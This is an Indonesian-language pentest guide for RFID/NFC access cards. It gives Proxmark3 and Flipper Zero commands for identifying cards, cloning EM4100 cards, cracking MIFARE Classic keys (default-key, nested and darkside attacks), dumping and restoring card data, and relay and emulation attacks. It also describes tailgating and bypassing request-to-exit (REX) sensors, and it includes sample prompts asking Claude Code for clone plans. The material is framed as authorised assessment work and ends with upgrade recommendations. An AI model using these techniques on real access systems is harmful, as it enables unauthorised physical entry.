# Hardware Pentest: RFID & NFC (Access Control)

**Target:** Kartu akses gedung, kartu karyawan, sistem absensi berbasis kartu  
**Durasi:** 1–3 hari  
**Hardware diperlukan:** Proxmark3 atau Flipper Zero, reader NFC (ACR122U)

---

## Jenis Kartu yang Umum Ditemukan

| Jenis Kartu | Frekuensi | Keamanan | Contoh |
|-------------|-----------|----------|--------|
| EM4100 / EM4200 | 125 kHz LF | **Sangat lemah** — tidak ada enkripsi | Kartu absensi murah |
| HID Prox | 125 kHz LF | **Lemah** — hanya ID, tidak ada enkripsi | Kartu kantor lama |
| MIFARE Classic 1K | 13.56 MHz HF | **Lemah** — enkripsi CRYPTO1 yang sudah dicrack | Kartu umum |
| MIFARE DESFire EV1 | 13.56 MHz HF | **Kuat** — AES, perlu key | Kartu modern |
| iClass | 13.56 MHz HF | Sedang — ada enkripsi | HID iClass |
| MIFARE Ultralight | 13.56 MHz HF | Sangat lemah — tanpa enkripsi | Tiket transportasi |

---

## Phase 1: Identifikasi Kartu

```bash
# Dengan Proxmark3 (paling powerful)
pm3 --> hw tune           # test antena
pm3 --> lf search         # scan kartu 125kHz
pm3 --> hf search         # scan kartu 13.56MHz

# Identifikasi detail kartu
pm3 --> hf 14a reader     # MIFARE/ISO 14443A info
pm3 --> hf mf info        # MIFARE Classic detail

# Dengan Flipper Zero (lebih portable)
# Buka app RFID → Read → scan kartu
# Buka app NFC → Read → scan kartu
# Hasilnya: type, UID, data yang bisa dibaca

# Dengan ACR122U + libnfc
nfc-list             # deteksi kartu
nfc-mfclassic       # baca MIFARE Classic
```

**Prompt Claude Code:**
```
Scanning kartu akses gedung dengan Proxmark3:

hf search output:
[+] UID: AA BB CC DD
[+] ATQA: 00 04
[+] SAK: 08
[+] Possible types: MIFARE Classic 1K

hf mf info output:
[+] Magic Gen1a backdoor detected  ← kartu clone!
[+] Sector 0 default key: FFFFFFFFFFFF
[+] 6/16 sectors menggunakan default key

Analisis:
1. MIFARE Classic 1K — tingkat keamanannya?
2. Default key pada 6 sektor — apa artinya?
3. Magic Gen1a backdoor — kartu ini bisa diklon dengan mudah?
4. Attack plan untuk clone kartu ini
```

---

## Phase 2: Cloning Kartu 125 kHz (LF)

```bash
# EM4100 / HID Prox — sangat mudah diklon

# Baca kartu original dengan Proxmark3
pm3 --> lf em 410x reader   # baca EM4100

# Output: EM 4x05 ID: 1234567890

# Clone ke kartu T5577 (writable 125kHz)
pm3 --> lf em 410x clone --id 1234567890

# Atau dengan Flipper Zero:
# RFID → Read kartu original → Save → Write ke blank T5577

# Jika menggunakan jarak jauh (long range reader):
# ChameleonMini atau Proxmark3 RDV4 bisa baca dari jarak jauh
```

---

## Phase 3: MIFARE Classic Attack

```bash
# MIFARE Classic menggunakan CRYPTO1 — sudah dicrack sejak 2008

# Method 1: Default key attack (banyak yang masih pakai default)
pm3 --> hf mf chk --1k -k FFFFFFFFFFFF -k A0A1A2A3A4A5 -k 000000000000

# Method 2: Nested attack (perlu 1 kunci valid)
pm3 --> hf mf nested --1k --block 0 --keytype A --key FFFFFFFFFFFF

# Method 3: Darkside attack (jika tidak ada kunci sama sekali)
pm3 --> hf mf darkside

# Setelah dapat semua kunci — dump seluruh kartu
pm3 --> hf mf dump --1k

# Clone ke kartu MIFARE Classic kosong
pm3 --> hf mf restore --1k --uid AABBCCDD

# Dengan mfoc (alternatif)
mfoc -O dump.mfd
mfcuk -C -R 0:A  # darkside attack
```

**Prompt Claude Code:**
```
MIFARE Classic 1K attack berhasil dengan Proxmark3.

Keys ditemukan:
Sector 0: KeyA=FFFFFFFFFFFF, KeyB=FFFFFFFFFFFF
Sector 1: KeyA=A0A1A2A3A4A5, KeyB=FFFFFFFFFFFF
Sector 3: KeyA=D3F7D3F7D3F7 (key NFC Forum!)
Sector 8: KeyA=4B791E4F24AB (custom key → ini sector penting!)

Data di Sector 0, Block 0: 01 02 03 04 (UID) + manufacturer data
Data di Sector 8: 00 0A 15 00 01 00 E8 (access rights data?)

Analisis:
1. Sektor 8 dengan custom key — kemungkinan berisi data akses
2. Apakah format ini bisa di-decode? (kemungkinan HID, Wiegand format)
3. Cara clone kartu dengan data yang sudah didapat
4. Cara verifikasi clone berhasil tanpa mencoba ke pintu asli dulu
5. Rekomendasi: upgrade ke MIFARE DESFire atau iClass SE
```

---

## Phase 4: Relay Attack (Jarak Jauh)

```bash
# Relay attack: baca kartu korban dari jarak jauh → relay ke reader

# Setup dengan dua Proxmark3:
# Unit 1 (dekat korban): baca kartu
pm3 --> hf sniff  # sniff komunikasi kartu-reader

# Unit 2 (dekat pintu/reader): replay
pm3 --> hf replay  # replay sinyal yang ditangkap

# ChameleonMini — emulasi kartu
# Upload data dump ke ChameleonMini
# ChameleonMini bisa emulasi MIFARE Classic, EM4100, dll
chameleon-cli set config UID=AABBCCDD
```

---

## Phase 5: NFC Attack (Smartphone)

```bash
# Banyak smartphone modern bisa baca NFC
# Apps: NFC Tools, MIFARE Classic Tool, TagWriter

# Android dengan root: bisa full read/write MIFARE Classic
# iPhone: hanya read UID (terbatas)

# Baca kartu MIFARE Classic dengan MIFARE Classic Tool (Android)
# Gunakan key dictionary → coba semua key umum → dump jika berhasil
```

---

## Phase 6: Physical Security Assessment

```bash
# Selain clone kartu, test physical security:

# 1. Tailgating test: ikut di belakang orang yang sah
# 2. Piggybacking: minta orang buka pintu untuk kita
# 3. Reader jarak jauh: baca kartu dari jarak 30-100cm
#    (dengan antena custom, bisa baca kartu di dompet orang!)

# Test apakah reader punya REX (Request to Exit) yang bisa dimanipulasi
# REX sensor di dalam pintu — jika ada gap di bawah pintu, bisa reach dengan kawat
```

---

## Checklist RFID/NFC Pentest

```
[ ] Identifikasi semua jenis kartu yang digunakan
[ ] Cek apakah menggunakan 125kHz (sangat mudah diklon)
[ ] MIFARE Classic: default key attack
[ ] MIFARE Classic: nested / darkside attack
[ ] Dump dan clone kartu percobaan
[ ] Test relay attack (jika relevant)
[ ] Physical tailgating test
[ ] Cek jarak baca reader (bisa dibaca dari jauh?)
[ ] Laporan: tingkat keamanan setiap kartu + rekomendasi upgrade
```

---

## Rekomendasi Keamanan

| Situasi | Rekomendasi |
|---------|-------------|
| Masih pakai 125kHz (EM4100, HID Prox) | Upgrade ke 13.56MHz dengan enkripsi |
| Pakai MIFARE Classic | Upgrade ke MIFARE DESFire EV2/EV3 atau iClass SE |
| Tidak ada mutual authentication | Implementasi challenge-response |
| Tidak ada audit trail | Tambah logging setiap akses |

---

## Durasi Estimasi

| Sub-skenario | Durasi |
|-------------|-----------|----------|
| Identifikasi & basic clone test | 0.5–1 hari | 1–2 hari |
| Full RFID/NFC security assessment | 2–3 hari | 4–6 hari |
